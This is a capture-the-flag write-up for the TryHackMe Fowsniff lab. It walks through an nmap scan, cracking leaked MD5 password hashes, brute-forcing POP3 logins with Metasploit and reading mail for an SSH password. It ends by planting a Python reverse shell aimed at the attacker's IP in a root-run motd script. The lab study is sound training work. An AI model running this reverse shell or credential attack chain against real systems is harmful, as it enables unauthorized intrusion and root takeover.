
Link - "https://tryhackme.com/room/ctf"

> Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

# Hack into the FowSniff organisation


Q1. Using nmap, scan this machine. What ports are open?

```shell
$ sudo nmap -sCV 10.10.96.36

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 21:08 BST
Nmap scan report for 10.10.96.36
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)

PORT    STATE SERVICE VERSION

22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)

80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/

110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE TOP USER CAPA UIDL RESP-CODES PIPELINING

143/tcp open  imap    Dovecot imapd
|_imap-capabilities: listed OK capabilities SASL-IR LITERAL+ AUTH=PLAINA0001 IMAP4rev1 have post-login more Pre-login ENABLE IDLE LOGIN-REFERRALS ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds

```

Visiting "http://10.10.96.36/" reveals the page for "Fowsniff Corp." .  

After some google search we can see "Fowsniff Corporation Passwords LEAKED!" here - "https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt".

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

Let's crack these - 

```
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```

We got these passwords and some user id from above. 

**Q2. Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?**

```users

mauer                                          
mustikka                                          
tegel                                          
baksteen                                          
seina
stone
mursten
parede                                          
sciana  
```

```passwords

carp4ever
skyler22
apples01
orlando12
mailcall
scoobydoo2
bilbo101
07011972
```

We used "auxiliary/scanner/pop3/pop3_login" metasploit module and set "RHOSTS, USER_FILE, and PASS_FILE" to get the correct login credentials.

We got a hit at - "seina:scoobydoo2"

**Q3. What was seina's password to the email service?**
	scoobydoo2

**Q4. Can you connect to the pop3 service with her credentials? What email information can you gather?**

> We tried to login using "telnet IP 110" or "nc IP 110" but it seems to failed due to some reason even with the correct credentials "siena:scoobydoo2".

After login we can use `list` command to check for any files and retrieve them with `retr <idNumber>`.

`retr 1` reveals a temporary password for "ssh" -  **S1ck3nBluff+secureshell**.  

Lets inspect the second file -

`retr 2` reveals a message from **baksteen**, indicating that the temporary password should still be the one for their account.

Let's SSH with the user as "bakseen" and the temp password - 
	`ssh baksteen@IP -p 22`.

**Q5. Looking through her emails, what was a temporary password set for her?**
	S1ck3nBluff+secureshell

**Q6. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?**

```shell

$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

$ find / -group users -type f 2>/dev/null

/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.profile
/home/baksteen/.bashrc
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
..........
```

In the _/etc/update-motd.d_ folder,  the _00-header_ file shows that the _/opt/cube/cube.sh_ file is run when a user connects to the machine using SSH (and that it will run as the _root_ user):

We can edit the _cube.sh_ file to include a python reverse shell that will trigger once our user logs in via SSH - (make sure you add your local IP and listener port):

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

Well after re-login using ssh, we can get the listener and root access to the system.

! Happy Hacking !